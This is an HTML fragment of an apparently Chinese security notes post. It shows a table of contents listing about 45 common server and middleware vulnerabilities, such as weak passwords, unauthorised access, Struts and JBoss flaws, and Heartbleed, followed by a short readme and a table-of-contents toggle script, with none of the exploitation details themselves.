+         <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0-Readme"><span class="toc-number">1.</span> <span class="toc-text">0 Readme </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-ftp%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E6%88%96%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">1 ftp匿名访问或弱口令 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-ftp%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE"><span class="toc-number">2.1.</span> <span class="toc-text">1.1 ftp匿名访问 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-ftp%E5%B8%B8%E8%A7%81%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">1.2 ftp常见弱口令 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E8%BE%B9%E5%AD%A6%E8%BE%B9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">1.3 边学边用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-rsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE"><span class="toc-number">3.</span> <span class="toc-text">2 rsync匿名访问 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">2.1 利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">3.2.</span> <span class="toc-text">2.2 安全配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%B4%BB%E5%AD%A6%E6%B4%BB%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">2.3 活学活用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">3 DNS域传送漏洞 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">4.1.</span> <span class="toc-text">3.1 漏洞成因 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">3.2 攻击方式 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">4.3.</span> <span class="toc-text">3.3 修复方案 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-weblogic%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">5.</span> <span class="toc-text">4 weblogic弱口令 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">5.1.</span> <span class="toc-text">4.1 基本信息 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">5.2.</span> <span class="toc-text">4.2 利用方式 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">5.3.</span> <span class="toc-text">4.3 安全配置 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E7%8E%B0%E5%AD%A6%E7%8E%B0%E5%8D%96"><span class="toc-number">5.4.</span> <span class="toc-text">4.4 现学现卖 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-struts%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">5 struts漏洞 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-S2-016%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.1.</span> <span class="toc-text">5.1 S2-016命令执行漏洞 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-S2-017%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.2.</span> <span class="toc-text">5.2 S2-017重定向漏洞 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-S2-019%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.3.</span> <span class="toc-text">5.3 S2-019命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">6 web服务器解析漏洞 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-IIS-6-0"><span class="toc-number">7.1.</span> <span class="toc-text">6.1 IIS 6.0 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37"><span class="toc-number">7.2.</span> <span class="toc-text">6.2 IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx&lt;&#x3D;0.8.37 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-3-Nginx-lt-0-8-37"><span class="toc-number">7.3.</span> <span class="toc-text">6.3 Nginx&lt;&#x3D;0.8.37 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-4-Apache"><span class="toc-number">7.4.</span> <span class="toc-text">6.4 Apache </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-5-lighttpd"><span class="toc-number">7.5.</span> <span class="toc-text">6.5 lighttpd </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-6-windows%E7%8E%AF%E5%A2%83"><span class="toc-number">7.6.</span> <span class="toc-text">6.6 windows环境 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-PHP-CGI%E8%BF%9C%E7%A8%8B%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.</span> <span class="toc-text">7 PHP-CGI远程任意代码执行漏洞 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">8.1.</span> <span class="toc-text">7.1 本地包含执行代码 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">8.2.</span> <span class="toc-text">7.2 远程包含执行代码 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-FCK%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.</span> <span class="toc-text">8 FCK编辑器上传漏洞 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#8-1-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">9.1.</span> <span class="toc-text">8.1 漏洞利用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-Apache-Server-Status%E5%AF%B9%E5%A4%96%E6%9A%B4%E9%9C%B2"><span class="toc-number">10.</span> <span class="toc-text">9 Apache Server Status对外暴露 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#9-1-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">10.1.</span> <span class="toc-text">9.1 利用方式 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%8F%AF%E4%B8%8B%E8%BD%BD"><span class="toc-number">11.</span> <span class="toc-text">10 网站备份文件可下载 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#10-1-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">11.1.</span> <span class="toc-text">10.1 利用方式 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE"><span class="toc-number">12.</span> <span class="toc-text">11 目录遍历并查看敏感数据 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#11-1-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">12.1.</span> <span class="toc-text">11.1 利用方式 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-SNMP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">13.</span> <span class="toc-text">12 SNMP信息泄露 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#12-1-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">13.1.</span> <span class="toc-text">12.1 基本原理 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-2-snmp%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">13.2.</span> <span class="toc-text">12.2 snmp弱口令 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-3-snmp%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="toc-number">13.3.</span> <span class="toc-text">12.3 snmp获取管理员密码 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-4-%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83"><span class="toc-number">13.4.</span> <span class="toc-text">12.4 实战演练 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-SVN%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">14.</span> <span class="toc-text">13 SVN源码泄露 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#13-1-SVN%E4%BB%8B%E7%BB%8D"><span class="toc-number">14.1.</span> <span class="toc-text">13.1 SVN介绍 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-2-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">14.2.</span> <span class="toc-text">13.2 漏洞原理 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14-hadhoop%E5%BA%94%E7%94%A8%E5%AF%B9%E5%A4%96%E8%AE%BF%E9%97%AE"><span class="toc-number">15.</span> <span class="toc-text">14 hadhoop应用对外访问 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#14-1-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="toc-number">15.1.</span> <span class="toc-text">14.1 基础概念 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">15.2.</span> <span class="toc-text">14.2 漏洞利用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15-Nagios%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">16.</span> <span class="toc-text">15 Nagios信息泄露 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#15-1-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">16.1.</span> <span class="toc-text">15.1 漏洞利用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16-RTX%E5%8D%B3%E6%97%B6%E9%80%9A%E4%BF%A1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">17.</span> <span class="toc-text">16 RTX即时通信信息泄露 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#16-1-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">17.1.</span> <span class="toc-text">16.1 漏洞利用 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-2-%E5%8A%A8%E6%89%8B%E5%AE%9E%E8%B7%B5"><span class="toc-number">17.2.</span> <span class="toc-text">16.2 动手实践 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#17-Ganglia%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">18.</span> <span class="toc-text">17 Ganglia系统监控信息泄露 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#17-1-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">18.1.</span> <span class="toc-text">17.1 漏洞利用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#18-j2ee%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84%EF%BC%88web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E9%85%8D%E4%B8%8D%E5%BD%93%EF%BC%89"><span class="toc-number">19.</span> <span class="toc-text">18 j2ee应用架构（web服务器搭配不当） </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#18-1-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">19.1.</span> <span class="toc-text">18.1 漏洞成因 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">19.2.</span> <span class="toc-text">18.2 漏洞利用 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-3-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">19.3.</span> <span class="toc-text">18.3 修复方案 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#19-Jenkins%E5%B9%B3%E5%8F%B0%E6%9C%AA%E8%AE%BE%E7%BD%AE%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81"><span class="toc-number">20.</span> <span class="toc-text">19 Jenkins平台未设置登录验证 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#19-1-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">20.1.</span> <span class="toc-text">19.1 漏洞利用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#20-zabbix%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4"><span class="toc-number">21.</span> <span class="toc-text">20 zabbix默认口令 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#20-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">21.1.</span> <span class="toc-text">20.1 基础知识 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-2-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">21.2.</span> <span class="toc-text">20.2 利用方式 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#21-zenoss%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4"><span class="toc-number">22.</span> <span class="toc-text">21 zenoss默认口令 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#21-1-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">22.1.</span> <span class="toc-text">21.1 基本知识 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">22.2.</span> <span class="toc-text">21.2 漏洞利用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#22-Resin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">23.</span> <span class="toc-text">22 Resin任意文件读取 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#22-1-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">23.1.</span> <span class="toc-text">22.1 基本知识 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">23.2.</span> <span class="toc-text">22.2 漏洞利用 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-3-%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%BB%83"><span class="toc-number">23.3.</span> <span class="toc-text">22.3 实例演练 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#23-memcache%E6%9C%AA%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AEIP"><span class="toc-number">24.</span> <span class="toc-text">23 memcache未限制访问IP </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#23-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">24.1.</span> <span class="toc-text">23.1 基础知识 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">24.2.</span> <span class="toc-text">23.2 漏洞利用 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-3-%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83"><span class="toc-number">24.3.</span> <span class="toc-text">23.3 实战演练 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#24-Jboss%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">25.</span> <span class="toc-text">24 Jboss配置不当 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#24-1-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">25.1.</span> <span class="toc-text">24.1 基本信息 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">25.2.</span> <span class="toc-text">24.2 漏洞利用 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-3-%E5%AE%9E%E4%BE%8B%E5%BA%94%E7%94%A8"><span class="toc-number">25.3.</span> <span class="toc-text">24.3 实例应用 </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-1-gt-admin-console-getshell"><span class="toc-number">25.3.1.</span> <span class="toc-text">&lt;1&gt; admin-console getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-2-gt-jmx-console-getshell"><span class="toc-number">25.3.2.</span> <span class="toc-text">&lt;2&gt; jmx-console getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-3-gt-web-console-getshell"><span class="toc-number">25.3.3.</span> <span class="toc-text">&lt;3&gt; web-console getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-41-gt-invoker-getshell"><span class="toc-number">25.3.4.</span> <span class="toc-text">&lt;41&gt; invoker getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#25-%E6%B5%8B%E8%AF%95%E6%9C%BA%E5%A4%96%E7%BD%91%E5%8F%AF%E8%AE%BF%E9%97%AE"><span class="toc-number">26.</span> <span class="toc-text">25 测试机外网可访问 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#26-padding-oracle-attack"><span class="toc-number">27.</span> <span class="toc-text">26 padding oracle attack </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#26-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">27.1.</span> <span class="toc-text">26.1 基础知识 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">27.2.</span> <span class="toc-text">26.2 漏洞利用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#27-tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">28.</span> <span class="toc-text">27 tomcat弱口令 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#27-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">28.1.</span> <span class="toc-text">27.1 基础知识 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">28.2.</span> <span class="toc-text">27.2 漏洞利用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#28-phpmyadmin%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">29.</span> <span class="toc-text">28 phpmyadmin弱口令 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#29-MongoDB%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">30.</span> <span class="toc-text">29 MongoDB配置不当 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#29-1-%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">30.1.</span> <span class="toc-text">29.1 基本介绍 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-2-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">30.2.</span> <span class="toc-text">29.2 未授权访问 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-3-%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83"><span class="toc-number">30.3.</span> <span class="toc-text">29.3 实战演练 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#30-%E5%90%84%E7%A7%8D%E6%95%8F%E6%84%9F%E5%90%8E%E5%8F%B0%E5%AF%B9%E5%A4%96%E5%BC%80%E6%94%BE"><span class="toc-number">31.</span> <span class="toc-text">30 各种敏感后台对外开放 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#31-Django%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%87%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">32.</span> <span class="toc-text">31 Django配置不当致信息泄露 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#32-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">33.</span> <span class="toc-text">32 Redis未授权访问 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#32-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">33.1.</span> <span class="toc-text">32.1 基础知识 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-2-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">33.2.</span> <span class="toc-text">32.2 利用方式 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-3-%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83"><span class="toc-number">33.3.</span> <span class="toc-text">32.3 实战演练 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#33-LDAP%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">34.</span> <span class="toc-text">33 LDAP未授权访问 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#33-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">34.1.</span> <span class="toc-text">33.1 基础知识 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-2-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">34.2.</span> <span class="toc-text">33.2 利用方式 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-3-%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="toc-number">34.3.</span> <span class="toc-text">33.3 应用实例 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#34-SMB%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">35.</span> <span class="toc-text">34 SMB弱口令 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#34-1-smb%E5%AD%97%E5%85%B8"><span class="toc-number">35.1.</span> <span class="toc-text">34.1 smb字典 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-2-MS08-067%E6%BA%A2%E5%87%BA"><span class="toc-number">35.2.</span> <span class="toc-text">34.2 MS08-067溢出 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#35-openssl%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80"><span class="toc-number">36.</span> <span class="toc-text">35 openssl心脏出血 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#36-squid%E4%BB%A3%E7%90%86%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-number">37.</span> <span class="toc-text">36 squid代理默认端口 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#37-GlassFish-web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">38.</span> <span class="toc-text">37 GlassFish web中间件弱口令 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#38-PHP-FastCGI%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8"><span class="toc-number">39.</span> <span class="toc-text">38 PHP FastCGI远程利用 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#39-elasticsearch%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">40.</span> <span class="toc-text">39 elasticsearch代码执行 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#40-websphere-web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">41.</span> <span class="toc-text">40 websphere web中间件弱口令 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#41-zebra%E8%B7%AF%E7%94%B1%E5%BC%B1%E5%AF%86%E7%A0%81"><span class="toc-number">42.</span> <span class="toc-text">41 zebra路由弱密码 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#42-rundeck-web"><span class="toc-number">43.</span> <span class="toc-text">42 rundeck web </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#43-dns%E6%9C%AA%E8%AE%BE%E7%BD%AEspf%E5%AF%BC%E8%87%B4%E9%82%AE%E7%AE%B1%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E"><span class="toc-number">44.</span> <span class="toc-text">43 dns未设置spf导致邮箱欺骗漏洞 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#44-CVS%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">45.</span> <span class="toc-text">44 CVS源码泄露 </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#44-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">45.1.</span> <span class="toc-text">44.1 基础知识 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-2-%E5%AE%9E%E4%BE%8B%E5%BA%94%E7%94%A8"><span class="toc-number">45.2.</span> <span class="toc-text">44.2 实例应用 </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#45-Tomcat-examples-directory%E6%BC%8F%E6%B4%9E"><span class="toc-number">46.</span> <span class="toc-text">45 Tomcat examples directory漏洞 </span></a></li></ol>
+       </div>
+ <script type="text/javascript">
+function showToc(){
+  var toc_article = document.getElementById("toc-article");
+  var show_toc_btn = document.getElementById("show-toc-btn");
+  toc_article.setAttribute("style","display:block");
+  show_toc_btn.setAttribute("style","display:none");
+  };
+function showBtn(){
+  var toc_article = document.getElementById("toc-article");
+  var show_toc_btn = document.getElementById("show-toc-btn");
+  toc_article.setAttribute("style","display:none");
+  show_toc_btn.setAttribute("style","display:block");
+  };
+ </script>
+    		
+<!-- 目录内容结束 -->
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+        
+          <h1 id="0-Readme"><a href="#0-Readme" class="headerlink" title="0 Readme "></a>0 Readme </h1><p>来源于网络，回馈于网络。</p>
+<p>以前简单的记录下学习的笔记，现在轻轻地拿出来与大家分享。</p>
+<p>这份paper没有太多个人思路，但却不失某一漏洞的利用方法及遇到的问题（当时有的没有解决，然而后来也没有继续补充）。</p>
+<p>仅单纯的按照自己的思路，记录和总结常见的运维相关安全漏洞。难免会有错误与不足（包括不全面）之处，还请大家不吝赐教。</p>
+<span id="more"></span>
+
